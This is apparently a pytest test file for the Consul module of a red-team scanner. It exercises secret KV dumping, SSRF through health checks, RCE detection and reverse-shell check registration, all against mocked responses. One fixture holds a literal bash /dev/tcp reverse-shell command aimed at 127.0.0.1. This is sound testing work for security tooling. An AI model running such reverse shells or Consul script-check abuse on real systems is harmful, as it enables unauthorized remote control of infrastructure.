from __future__ import annotations

import argparse
import base64
import json
import urllib.error

import pytest

from redposture_core import stage_consul as consul


def _scope_fixture(ok_kv: bool, ok_services: bool, ok_agents: bool) -> dict[str, dict[str, object]]:
    return {
        "kv": {"ok": ok_kv, "count": 1 if ok_kv else 0, "status": 200 if ok_kv else 403, "error": "denied"},
        "services": {
            "ok": ok_services,
            "count": 2 if ok_services else 0,
            "status": 200 if ok_services else 403,
            "error": "denied",
        },
        "agents": {
            "ok": ok_agents,
            "count": 3 if ok_agents else 0,
            "status": 200 if ok_agents else 403,
            "error": "denied",
        },
    }


class _ConsoleCapture:
    instances: list[_ConsoleCapture] = []

    def __init__(self, debug: bool = False) -> None:
        self.debug = debug
        self.messages: list[tuple[str, str]] = []
        type(self).instances.append(self)

    def error(self, message: str) -> None:
        self.messages.append(("error", message))

    def warn(self, message: str) -> None:
        self.messages.append(("warn", message))

    def info(self, message: str) -> None:
        self.messages.append(("info", message))

    def plain(self, message: str, color: str | None = None) -> None:
        _ = color
        self.messages.append(("plain", message))

    def render_tagged_payload_line(self, line: str, tag: str, payload_color: str | None = None) -> bool:
        _ = (line, tag, payload_color)
        return False


def _consul_args(**overrides: object) -> argparse.Namespace:
    data: dict[str, object] = {
        "debug": False,
        "timeout": 1.0,
        "retries": 0,
        "ports": None,
        "port": 8500,
        "targets": "127.0.0.1",
        "hosts": None,
        "hosts_file": None,
        "token": None,
        "username": None,
        "password": None,
        "ssrf_target": None,
        "ssrf_port": None,
        "ssrf_path": None,
        "show_keys": False,
        "kv_key": None,
        "dump": False,
        "show_services": False,
        "show_agents": False,
        "show_checks": False,
        "show_nodes": False,
        "service_dump_name": None,
        "agent_name": None,
        "node_name": None,
        "revshell": False,
        "delete_revshell": False,
        "revshell_listen": False,
        "revshell_host": None,
        "revshell_port": None,
        "revshell_payload": None,
        "revshell_check_id": None,
        "output": None,
        "output_format": "txt",
        "workers": 1,
    }
    data.update(overrides)
    return argparse.Namespace(**data)


def test_scope_status_helpers() -> None:
    all_ok = _scope_fixture(True, True, True)
    none_ok = _scope_fixture(False, False, False)

    assert consul._all_scopes_ok(all_ok) is True
    assert consul._no_scopes_ok(all_ok) is False
    assert consul._all_scopes_ok(none_ok) is False
    assert consul._no_scopes_ok(none_ok) is True


def test_scope_suffix_helpers() -> None:
    scopes = _scope_fixture(True, False, True)
    counts = consul._scope_counts_suffix(scopes)
    bools = consul._scope_bools_suffix(scopes)
    assert "(kv:1)" in counts and "(services:0)" in counts and "(agents:3)" in counts
    assert "(kv:True)" in bools and "(services:False)" in bools and "(agents:True)" in bools


def test_scope_detail_lines_contains_errors_for_failed_scopes() -> None:
    scopes = _scope_fixture(True, False, False)
    lines = consul._scope_status_detail_lines("CONSUL\t127.0.0.1\t8500\t", scopes)
    assert len(lines) == 2
    assert all("err=denied" in line for line in lines)


def test_anonymous_acl_denied_with_filtered_empty() -> None:
    scopes_zero = {
        "kv": {"ok": False, "count": 0},
        "services": {"ok": False, "count": 0},
        "agents": {"ok": False, "count": 0},
    }
    record = {"anonymous_self_ok": False, "anonymous_self_error": "permission denied"}
    assert consul._anonymous_acl_denied_with_filtered_empty(record, scopes_zero) is True


def test_normalize_ssrf_helpers() -> None:
    assert consul._normalize_ssrf_path("/v1/agent/self?x=1") == ("/v1/agent/self", "x=1")
    urls = consul._normalize_ssrf_urls("127.0.0.1", "8500,8501", "/v1/status/leader")
    assert urls == [
        "http://127.0.0.1:8500/v1/status/leader",
        "http://127.0.0.1:8501/v1/status/leader",
    ]


def test_detect_line_for_fail_not_consul_and_detected() -> None:
    fail = consul._detect_line(
        {"host": "127.0.0.1", "port": 8500, "is_consul": False, "status": "fail", "error": "timeout"}, "txt"
    )
    assert "[!] connection failed err=timeout" in fail

    not_consul = consul._detect_line(
        {"host": "127.0.0.1", "port": 8500, "is_consul": False, "status": "not_consul"}, "txt"
    )
    assert "[-] not a Consul API" in not_consul

    detected = consul._detect_line(
        {
            "host": "127.0.0.1",
            "port": 8500,
            "is_consul": True,
            "version": "1.20.0",
            "anonymous_scopes": _scope_fixture(True, True, True),
            "anonymous_self_ok": True,
            "anonymous_self_error": "",
        },
        "txt",
    )
    assert "[*] Consul Agent" in detected
    assert "(auth required:False)" in detected


def test_summary_line_for_anonymous_access_and_partial() -> None:
    full = consul._summary_line(
        {
            "is_consul": True,
            "anonymous_scopes": _scope_fixture(True, True, True),
            "anonymous_self_ok": True,
            "anonymous_self_error": "",
            "rce": False,
        }
    )
    assert full is not None and full.startswith("[+] anonymous access")

    partial = consul._summary_line(
        {
            "is_consul": True,
            "anonymous_scopes": _scope_fixture(True, False, False),
            "anonymous_self_ok": True,
            "anonymous_self_error": "",
        }
    )
    assert partial is not None and partial.startswith("[!] anonymous partial access")


def test_auth_summary_line_token_valid_and_failed() -> None:
    ok_line = consul._auth_summary_line(
        {
            "auth_mode": "token",
            "auth_valid": True,
            "auth_scopes": _scope_fixture(True, True, False),
            "rce": False,
        }
    )
    assert ok_line is not None and ok_line.startswith("[+] token auth")

    fail_line = consul._auth_summary_line(
        {
            "auth_mode": "basic",
            "_username_display": "admin",
            "_password_display": "bad",
            "auth_valid": False,
            "auth_error": "denied",
            "auth_scopes": _scope_fixture(False, False, False),
        }
    )
    assert fail_line is not None and fail_line.startswith("[-] admin:bad failed")
    assert "err=denied" in fail_line


def test_bool_text() -> None:
    assert consul._bool_text(True) == "True"
    assert consul._bool_text(False) == "False"
    assert consul._bool_text(None) == "unknown"


def test_consul_helper_decoders_and_flags() -> None:
    assert consul._friendly_error_text("<urlopen error certificate verify failed>") == (
        "tls verification failed (try --insecure or trusted cert)"
    )
    assert consul._friendly_error_text("[Errno 61] Connection refused") == (
        "connection refused (service is not listening on target port)"
    )
    assert consul._friendly_error_from_exception(urllib.error.URLError(TimeoutError("timed out"))) == (
        "connection timeout"
    )
    assert consul._is_tls_verify_error_text("self signed certificate") is True
    assert consul._consul_headers("tok", "alice", "secret")["X-Consul-Token"] == "tok"
    assert consul._consul_headers(None, "alice", "secret")["Authorization"].startswith("Basic ")
    assert consul._parse_consul_leader(b'"127.0.0.1:8300"') == "127.0.0.1:8300"
    assert consul._looks_like_consul_payload(200, b'"127.0.0.1:8300"') is True
    assert consul._count_kv_keys(["a", "b"]) == 2
    assert consul._count_services({"svc": [], "svc2": []}) == 2
    assert consul._count_agents([{"a": 1}, {"b": 2}]) == 2
    assert consul._count_health_checks([{"id": 1}]) == 1
    payload = {
        "Config": {"Version": "1.17.3"},
        "Nested": {"EnableLocalScriptChecks": "true", "x": [{"EnableRemoteScriptChecks": False}]},
    }
    assert consul._extract_consul_version(payload) == "1.17.3"
    assert consul._find_bool_recursive(payload, "EnableLocalScriptChecks") is True
    assert consul._extract_script_check_flags(payload) == (True, False)


def test_request_with_tls_fallback_probe_and_put_helpers(monkeypatch: pytest.MonkeyPatch) -> None:
    responses = iter(
        [
            (0, b"", {}, "tls verification failed (try --insecure or trusted cert)"),
            (200, b'{"ok":true}', {}, None),
        ]
    )
    monkeypatch.setattr(consul, "_http_request", lambda *args, **kwargs: next(responses))
    status, payload, headers, error, effective_insecure, tls_auto = consul._request_with_tls_fallback(
        "127.0.0.1",
        8500,
        "GET",
        "/v1/status/leader",
        1.0,
        use_https=True,
        insecure=False,
    )
    assert status == 200
    assert payload == b'{"ok":true}'
    assert headers == {}
    assert error is None
    assert effective_insecure is True
    assert tls_auto is True

    probe_responses = iter(
        [
            (404, b"missing", {}, None, False, False),
            (403, b'"permission denied"', {}, None, False, False),
        ]
    )
    monkeypatch.setattr(consul, "_request_with_tls_fallback", lambda *args, **kwargs: next(probe_responses))
    assert consul._probe_consul_scheme("127.0.0.1", 8500, 1.0) == (True, "https", False, False, None, None)

    monkeypatch.setattr(
        consul,
        "_request_with_tls_fallback",
        lambda *args, **kwargs: (200, b'{"status":"ok"}', {}, None, False, False),
    )
    status, payload, error = consul._consul_put_json(
        "127.0.0.1",
        8500,
        "/v1/agent/service/register",
        1.0,
        {"Name": "web"},
        scheme="http",
        insecure=False,
    )
    assert (status, payload, error) == (200, {"status": "ok"}, None)

    monkeypatch.setattr(
        consul,
        "_request_with_tls_fallback",
        lambda *args, **kwargs: (500, b"boom", {}, None, False, False),
    )
    assert consul._consul_put_no_body(
        "127.0.0.1",
        8500,
        "/v1/agent/check/deregister/rev-rp-1",
        1.0,
        scheme="http",
        insecure=False,
    ) == (500, "boom")


def test_consul_catalog_services_and_kv_value_helpers(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_get_json_any(*args, **kwargs):  # type: ignore[no-untyped-def]
        _ = (args, kwargs)
        return 200, {"web": ["public"], "db": ["primary", "rw"]}, None, False, False

    monkeypatch.setattr(consul, "_consul_get_json_any", fake_get_json_any)
    items, error = consul._consul_catalog_services_list(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert error is None
    assert items == [
        {"name": "db", "tags": ["primary", "rw"]},
        {"name": "web", "tags": ["public"]},
    ]

    assert consul._normalize_inline_text("a   b\n c") == "a b c"
    raw = base64.b64encode(b"secret value\n").decode("ascii")
    assert consul._decode_consul_kv_value(raw) == "secret value"
    assert consul._decode_consul_kv_value(123) == "123"


def test_detail_lines_cover_transport_kv_and_services() -> None:
    record = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "scheme": "http",
        "tls_auto_insecure": True,
        "local_script_checks": True,
        "remote_script_checks": True,
        "rce": True,
        "anonymous_scopes": _scope_fixture(True, False, False),
        "auth_scopes": _scope_fixture(False, True, False),
        "dump_requested": True,
        "dump_all_requested": True,
        "kv_dump_items": [{"key": "secret/app", "value": "topsecret"}],
        "services_list_requested": True,
        "services_list": [{"name": "web"}],
        "service_instances": {
            "web": [
                {
                    "node_name": "node-1",
                    "node_address": "10.0.0.10",
                    "node_datacenter": "dc1",
                    "service_address": "10.0.0.20",
                    "service_port": 8080,
                    "service_id": "web-1",
                    "meta": {"team": "sre", "redposture_args": "--dump"},
                    "checks": [
                        {
                            "check_id": "service:web-1",
                            "name": "web",
                            "status": "passing",
                            "http": "http://10.0.0.20:8080/health",
                            "interval": "10s",
                            "notes": "healthy service",
                            "output": "HTTP 200 OK",
                        }
                    ],
                }
            ]
        },
        "service_instances_errors": {},
    }
    lines = consul._detail_lines(record, "txt", debug=True)
    joined = "\n".join(lines)
    assert "Transport (scheme:http) (tls_auto_insecure:True)" in joined
    assert "RCE! (EnableLocalScriptChecks:True) (EnableRemoteScriptChecks:True)" in joined
    assert "[*] KV Dump" in joined
    assert "secret/app=topsecret" in joined
    assert "[*] Services" in joined
    assert "meta.team=sre" in joined
    assert "args=--dump" in joined
    assert "check_id=service:web-1" in joined
    assert "output=HTTP 200 OK" in joined


def test_audit_consul_targets_json_output_is_machine_readable(monkeypatch, tmp_path) -> None:  # type: ignore[no-untyped-def]
    def fake_audit_consul_host(*args, **kwargs):  # type: ignore[no-untyped-def]
        _ = (args, kwargs)
        return {
            "timestamp": "2026-03-26T18:01:07Z",
            "host": "127.0.0.1",
            "port": 8500,
            "is_consul": True,
            "status": "ok",
            "scheme": "http",
            "version": "1.17.3",
            "anonymous_scopes": _scope_fixture(True, False, False),
            "anonymous_self_ok": True,
            "anonymous_self_error": None,
            "auth_mode": None,
            "auth_valid": None,
            "auth_scopes": {},
            "rce": False,
            "error": None,
        }

    monkeypatch.setattr(consul, "_audit_consul_host", fake_audit_consul_host)
    output_path = tmp_path / "consul.json"

    total, detected, failed, revshell_registered = consul.audit_consul_targets(
        hosts=["127.0.0.1"],
        port=8500,
        timeout=1.0,
        retries=0,
        workers=1,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
        output_path=str(output_path),
        output_format="json",
    )

    assert (total, detected, failed, revshell_registered) == (1, 1, 0, False)
    lines = output_path.read_text(encoding="utf-8").splitlines()
    assert len(lines) == 1
    assert json.loads(lines[0])["is_consul"] is True


def test_audit_consul_host_full_auth_flow_with_actions_and_revshell(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_args, **_kwargs: (True, "https", True, True, "127.0.0.1:8300", None),
    )

    def fake_access_matrix(*_args, headers=None, **_kwargs):  # type: ignore[no-untyped-def]
        return _scope_fixture(False, False, False) if headers is None else _scope_fixture(True, True, True)

    def fake_self_probe(*_args, headers=None, **_kwargs):  # type: ignore[no-untyped-def]
        if headers is None:
            return {"ok": False, "error": "permission denied"}
        return {
            "ok": True,
            "version": "1.17.3",
            "local_script_checks": True,
            "remote_script_checks": True,
            "error": None,
        }

    monkeypatch.setattr(consul, "_consul_access_matrix", fake_access_matrix)
    monkeypatch.setattr(consul, "_agent_self_probe", fake_self_probe)
    monkeypatch.setattr(consul, "_consul_kv_keys_list", lambda *_args, **_kwargs: (["secret/app"], None))
    monkeypatch.setattr(
        consul,
        "_consul_kv_dump",
        lambda *_args, **_kwargs: ([{"key": "secret/app", "value": "topsecret"}], None),
    )
    monkeypatch.setattr(
        consul,
        "_consul_catalog_services_list",
        lambda *_args, **_kwargs: ([{"name": "web"}, {"name": "db"}], None),
    )
    monkeypatch.setattr(
        consul,
        "_consul_get_checks",
        lambda *_args, **_kwargs: (
            200,
            {
                "service:web-1": {
                    "CheckID": "service:web-1",
                    "Name": "web",
                    "Status": "passing",
                    "ServiceID": "web-1",
                    "HTTP": "http://10.0.0.20:8080/health",
                }
            },
            None,
        ),
    )
    monkeypatch.setattr(
        consul,
        "_consul_health_service_instances",
        lambda *_args, **_kwargs: (
            [
                {
                    "node_name": "node-1",
                    "node_address": "10.0.0.10",
                    "node_datacenter": "dc1",
                    "service_address": "10.0.0.20",
                    "service_port": 8080,
                    "service_id": "web-1",
                    "meta": {"team": "sre", "redposture_args": "--dump"},
                    "checks": [
                        {
                            "check_id": "service:web-1",
                            "name": "web",
                            "status": "passing",
                            "http": "http://10.0.0.20:8080/health",
                            "output": "HTTP 200 OK",
                        }
                    ],
                }
            ],
            None,
        ),
    )
    monkeypatch.setattr(
        consul,
        "_consul_agent_members_list",
        lambda *_args, **_kwargs: (
            [{"name": "node-1", "addr": "10.0.0.10", "dc": "dc1", "role": "server", "port": 8301, "status": "alive"}],
            None,
        ),
    )
    monkeypatch.setattr(
        consul,
        "_consul_catalog_nodes_list",
        lambda *_args, **_kwargs: ([{"name": "node-1", "address": "10.0.0.10", "datacenter": "dc1"}], None),
    )
    monkeypatch.setattr(
        consul,
        "_consul_service_action",
        lambda *_args, **_kwargs: {"name": "redposture", "action": "create", "ok": True, "args": "--dump"},
    )
    monkeypatch.setattr(
        consul,
        "_consul_ssrf_probe",
        lambda *_args, target_url, **_kwargs: {
            "target_url": target_url,
            "registered": True,
            "status": "passing",
            "output": "HTTP 200 OK",
            "deregistered": True,
        },
    )
    monkeypatch.setattr(
        consul,
        "_consul_script_revshell",
        lambda *_args, **_kwargs: {
            "action": "create",
            "listener": "127.0.0.1:4444",
            "script": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
            "registered": True,
            "check_id": "rp-revshell",
            "wait_seconds": 1.5,
            "auto_cleanup": True,
            "deregistered": True,
        },
    )

    record = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        0,
        token="root-token",
        username=None,
        password=None,
        do_ssrf=True,
        ssrf_urls=["http://127.0.0.1:9100/metrics"],
        show_keys=True,
        kv_key=None,
        dump_requested=True,
        dump_all_requested=True,
        show_services=True,
        show_agents=True,
        show_checks=True,
        check_dump_id="service:web-1",
        show_nodes=True,
        service_name="redposture",
        service_dump_name="web",
        agent_dump_name="node-1",
        node_dump_name="node-1",
        delete_service=False,
        service_args="--dump",
        revshell_enabled=True,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host="127.0.0.1",
        revshell_port=4444,
        revshell_payload=None,
        revshell_check_id="rp-revshell",
    )

    assert record["status"] == "ok"
    assert record["auth_mode"] == "token"
    assert record["auth_valid"] is True
    assert record["version"] == "1.17.3"
    assert record["rce"] is True
    assert record["service_result"]["ok"] is True
    assert record["ssrf_results"][0]["registered"] is True
    assert record["script_revshell"]["registered"] is True


def test_audit_consul_host_not_consul_and_fail_record(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_args, **_kwargs: (False, None, False, False, None, "connection timeout"),
    )
    record = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        0,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
    )
    assert record["status"] == "fail"
    assert record["error"] == "connection timeout"

    monkeypatch.setattr(
        consul,
        "_probe_consul_scheme",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(OSError("connection refused")),
    )
    monkeypatch.setattr(consul, "_retry_delay", lambda _attempt: 0.0)
    failed = consul._audit_consul_host(
        "127.0.0.1",
        8500,
        1.0,
        1,
        token=None,
        username=None,
        password=None,
        do_ssrf=False,
        ssrf_urls=[],
        show_keys=False,
        kv_key=None,
        dump_requested=False,
        dump_all_requested=False,
        show_services=False,
        show_agents=False,
        show_checks=False,
        check_dump_id=None,
        show_nodes=False,
        service_name=None,
        service_dump_name=None,
        agent_dump_name=None,
        node_dump_name=None,
        delete_service=False,
        service_args=None,
        revshell_enabled=False,
        delete_revshell=False,
        revshell_listen=False,
        revshell_host=None,
        revshell_port=None,
        revshell_payload=None,
        revshell_check_id=None,
    )
    assert failed["status"] == "fail"
    assert "connection refused" in str(failed["error"])


def test_detail_lines_cover_checks_nodes_ssrf_and_revshell() -> None:
    record = {
        "host": "127.0.0.1",
        "port": 8500,
        "is_consul": True,
        "anonymous_scopes": _scope_fixture(False, False, False),
        "auth_scopes": _scope_fixture(True, True, True),
        "scheme": "https",
        "tls_auto_insecure": True,
        "local_script_checks": True,
        "remote_script_checks": True,
        "rce": True,
        "dump_requested": True,
        "dump_all_requested": True,
        "keys_requested": True,
        "kv_dump_items": [{"key": "secret/app", "value": "topsecret"}],
        "services_list_requested": True,
        "services_list_source": "auth",
        "services_list": [{"name": "web"}],
        "service_instances": {
            "web": [
                {
                    "node_name": "node-1",
                    "node_address": "10.0.0.10",
                    "node_datacenter": "dc1",
                    "service_address": "10.0.0.20",
                    "service_port": 8080,
                    "service_id": "web-1",
                    "meta": {"team": "sre", "redposture_args": "--dump"},
                    "checks": [
                        {"check_id": "service:web-1", "name": "web", "status": "passing", "output": "HTTP 200 OK"}
                    ],
                }
            ]
        },
        "service_instances_errors": {},
        "agents_list_requested": True,
        "agents_list_source": "auth",
        "agents_list": [
            {"name": "node-1", "addr": "10.0.0.10", "dc": "dc1", "role": "server", "port": 8301, "status": "alive"}
        ],
        "checks_list_requested": True,
        "checks_list_source": "auth",
        "checks_list": [
            {
                "check_id": "service:web-1",
                "name": "web",
                "status": "passing",
                "service_id": "web-1",
                "output": "HTTP 200 OK",
            }
        ],
        "nodes_list_requested": True,
        "nodes_list_source": "auth",
        "nodes_list": [{"name": "node-1", "address": "10.0.0.10", "datacenter": "dc1"}],
        "service_result": {"name": "redposture", "action": "delete", "ok": False, "error": "denied", "status": 403},
        "ssrf_results": [
            {
                "target_url": "http://127.0.0.1:9100/metrics",
                "registered": True,
                "status": "passing",
                "output": "HTTP 200 OK",
                "deregistered": False,
                "deregister_error": "denied",
            }
        ],
        "script_revshell": {
            "action": "delete",
            "target_check_id": "rp-revshell",
            "queried": True,
            "matched": 1,
            "deleted": 0,
            "items": [{"check_id": "rp-revshell", "ok": False, "error": "denied"}],
        },
    }

    lines = consul._detail_lines(record, "txt", debug=True)
    text = "\n".join(lines)
    assert "[*] Agent Checks" in text
    assert "[*] Nodes" in text
    assert "[*] SSRF Check" in text
    assert "service delete failed err=denied status=403" in text
    assert "Reverse-shell cleanup (check_id:rp-revshell)" in text


def test_put_helpers_and_misc_error_helpers(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_request_with_tls_fallback(
        _host: str,
        _port: int,
        method: str,
        path: str,
        _timeout: float,
        *,
        use_https: bool,
        insecure: bool,
        headers: dict[str, str] | None = None,
        body: bytes | None = None,
    ):  # type: ignore[no-untyped-def]
        _ = (use_https, insecure, headers, body)
        if method == "PUT" and path == "/v1/ok":
            return 200, b'{"ok":true}', {}, None, False, False
        if method == "PUT" and path == "/v1/nobody":
            return 204, b"", {}, None, False, False
        if method == "PUT" and path == "/v1/fail":
            return 500, b'{"error":"boom"}', {}, None, False, False
        pytest.fail(f"unexpected {method} {path}")

    monkeypatch.setattr(consul, "_request_with_tls_fallback", fake_request_with_tls_fallback)

    status, payload, error = consul._consul_put_json(
        "127.0.0.1",
        8500,
        "/v1/ok",
        1.0,
        {"x": 1},
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert (status, payload, error) == (200, {"ok": True}, None)

    status, error = consul._consul_put_no_body(
        "127.0.0.1",
        8500,
        "/v1/nobody",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert (status, error) == (204, None)

    status, error = consul._consul_put_no_body(
        "127.0.0.1",
        8500,
        "/v1/fail",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert status == 500
    assert error == '{"error":"boom"}'

    assert consul._revshell_wait_seconds(0.1) >= 12.0
    assert consul._consul_error_detail_text({"x": 1}) == '{"x":1}'
    assert consul._consul_error_detail_text(["a", "b"]) == '["a","b"]'
    assert consul._consul_error_detail_text("  denied  ") == "denied"


def test_consul_inventory_builders_cover_checks_kv_members_nodes_and_health(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_get_json_any(*args, **kwargs):  # type: ignore[no-untyped-def]
        path = args[2]
        if path == "/v1/agent/checks":
            return (
                200,
                {
                    "service:web-1": {
                        "Name": "web",
                        "Status": "passing",
                        "ServiceID": "web-1",
                        "Definition": {"HTTP": "http://10.0.0.20:8080/health", "Interval": "10s"},
                        "Args": ["curl", "-fsS", "http://10.0.0.20:8080/health"],
                    }
                },
                None,
                False,
                False,
            )
        if path == "/v1/kv/?keys&recurse":
            return 200, ["secret/app", "config/api"], None, False, False
        if path == "/v1/kv/?recurse":
            return (
                200,
                [{"Key": "secret/app", "Value": base64.b64encode(b"topsecret").decode("ascii"), "Flags": 1}],
                None,
                False,
                False,
            )
        if path == "/v1/agent/members":
            return (
                200,
                [
                    {
                        "Name": "node-1",
                        "Addr": "10.0.0.10",
                        "Port": 8301,
                        "Status": "alive",
                        "Tags": {"role": "server", "dc": "dc1"},
                    }
                ],
                None,
                False,
                False,
            )
        if path == "/v1/catalog/nodes":
            return 200, [{"Node": "node-1", "Address": "10.0.0.10", "Datacenter": "dc1"}], None, False, False
        if path == "/v1/health/service/web":
            return (
                200,
                [
                    {
                        "Node": {"Node": "node-1", "Address": "10.0.0.10", "Datacenter": "dc1"},
                        "Service": {
                            "ID": "web-1",
                            "Address": "10.0.0.20",
                            "Port": 8080,
                            "Meta": {"team": "sre"},
                        },
                        "Checks": [
                            {"CheckID": "service:web-1", "Name": "web", "Status": "passing", "ServiceID": "web-1"}
                        ],
                    }
                ],
                None,
                False,
                False,
            )
        pytest.fail(f"unexpected path: {path}")

    monkeypatch.setattr(consul, "_consul_get_json_any", fake_get_json_any)

    checks_status, checks_payload, checks_error = consul._consul_get_checks(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert checks_status == 200
    assert checks_error is None
    parsed_checks = consul._consul_agent_checks_list(checks_payload or {})
    assert parsed_checks[0]["check_id"] == "service:web-1"
    assert parsed_checks[0]["http"] == "http://10.0.0.20:8080/health"
    assert parsed_checks[0]["script"] == "<from args> curl -fsS http://10.0.0.20:8080/health"

    kv_keys, kv_keys_error = consul._consul_kv_keys_list(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert kv_keys_error is None
    assert kv_keys == ["config/api", "secret/app"]

    kv_dump, kv_dump_error = consul._consul_kv_dump("127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None)
    assert kv_dump_error is None
    assert kv_dump == [{"key": "secret/app", "value": "topsecret", "flags": 1, "modify_index": None}]

    members, members_error = consul._consul_agent_members_list(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert members_error is None
    assert members == [
        {"name": "node-1", "addr": "10.0.0.10", "port": 8301, "status": "alive", "role": "server", "dc": "dc1"}
    ]

    nodes, nodes_error = consul._consul_catalog_nodes_list(
        "127.0.0.1", 8500, 1.0, scheme="http", insecure=False, headers=None
    )
    assert nodes_error is None
    assert nodes == [{"name": "node-1", "address": "10.0.0.10", "datacenter": "dc1"}]

    service_instances, service_instances_error = consul._consul_health_service_instances(
        "127.0.0.1",
        8500,
        "web",
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        agent_checks={"service:web-1": checks_payload["service:web-1"]},
    )
    assert service_instances_error is None
    assert service_instances == [
        {
            "service_name": "web",
            "node_name": "node-1",
            "node_address": "10.0.0.10",
            "node_datacenter": "dc1",
            "service_id": "web-1",
            "service_address": "10.0.0.20",
            "service_port": 8080,
            "meta": {"team": "sre"},
            "checks": [
                {
                    "check_id": "service:web-1",
                    "name": "web",
                    "status": "passing",
                    "service_id": "web-1",
                    "notes": None,
                    "output": None,
                    "args": ["curl", "-fsS", "http://10.0.0.20:8080/health"],
                    "script": "<from args> curl -fsS http://10.0.0.20:8080/health",
                    "type": None,
                    "http": "http://10.0.0.20:8080/health",
                    "tcp": None,
                    "grpc": None,
                    "method": None,
                    "interval": "10s",
                    "timeout": None,
                    "ttl": None,
                    "deregister_after": None,
                    "namespace": None,
                    "partition": None,
                    "definition_raw": '{"HTTP":"http://10.0.0.20:8080/health","Interval":"10s"}',
                }
            ],
        }
    ]


def test_service_action_and_revshell_cleanup(monkeypatch: pytest.MonkeyPatch) -> None:
    def fake_get_json_any(*args, **kwargs):  # type: ignore[no-untyped-def]
        path = args[2]
        if path == "/v1/agent/services":
            return 200, {"svc-1": {"Service": "web", "ID": "svc-1"}}, None, False, False
        pytest.fail(f"unexpected path: {path}")

    put_calls: list[str] = []

    def fake_put_no_body(
        _host: str,
        _port: int,
        path: str,
        _timeout: float,
        *,
        scheme: str,
        insecure: bool,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, str | None]:
        _ = (scheme, insecure, headers)
        put_calls.append(path)
        if path.endswith("/svc-1"):
            return 200, None
        return 403, "denied"

    def fake_put_json(
        _host: str,
        _port: int,
        path: str,
        _timeout: float,
        payload: dict[str, object],
        *,
        scheme: str,
        insecure: bool,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, object, str | None]:
        _ = (scheme, insecure, headers)
        assert path == "/v1/agent/service/register"
        assert payload["Name"] == "web"
        return 200, None, None

    monkeypatch.setattr(consul, "_consul_get_json_any", fake_get_json_any)
    monkeypatch.setattr(consul, "_consul_put_no_body", fake_put_no_body)
    monkeypatch.setattr(consul, "_consul_put_json", fake_put_json)

    delete_result = consul._consul_service_action(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        service_name="web",
        delete=True,
    )
    assert delete_result["ok"] is True
    assert delete_result["id"] == "svc-1"
    assert put_calls[-1].endswith("/svc-1")

    create_result = consul._consul_service_action(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
        service_name="web",
        delete=False,
        service_args="--dump",
    )
    assert create_result["ok"] is True
    assert create_result["status"] == 200

    monkeypatch.setattr(
        consul,
        "_consul_get_checks",
        lambda *_args, **_kwargs: (
            200,
            {"rev-rp-a": {}, "keep": {}, "rev-rp-b": {}},
            None,
        ),
    )
    cleanup_result = consul._consul_script_revshell_cleanup(
        "127.0.0.1",
        8500,
        1.0,
        scheme="http",
        insecure=False,
        headers=None,
    )
    assert cleanup_result["matched"] == 2
    assert cleanup_result["deleted"] == 0
    assert {item["check_id"] for item in cleanup_result["items"]} == {"rev-rp-a", "rev-rp-b"}


@pytest.mark.parametrize(
    ("overrides", "expected_message"),
    [
        ({"timeout": 0}, "--timeout must be > 0"),
        ({"retries": -1}, "--retries must be >= 0"),
        ({"ssrf_port": "8080"}, "--ssrf-port/--ssrf-path require --ssrf-target"),
        ({"kv_key": "secret/app"}, "--key requires --dump"),
        ({"service_dump_name": "web"}, "--service requires --dump"),
        ({"revshell_check_id": "rp-1"}, "--check-id requires --revshell, --delete, or --dump"),
        ({"revshell_listen": True}, "--listen requires --revshell"),
        ({"revshell": True, "revshell_listen": True}, "--listen requires --lport"),
        ({"revshell": True}, "--lhost is required when --revshell is set"),
    ],
)
def test_run_consul_stage_validation_errors(
    monkeypatch: pytest.MonkeyPatch, overrides: dict[str, object], expected_message: str
) -> None:
    _ConsoleCapture.instances.clear()
    monkeypatch.setattr(consul, "Console", _ConsoleCapture)
    rc = consul.run_consul_stage(_consul_args(**overrides), logger=object())  # type: ignore[arg-type]
    assert rc == 2
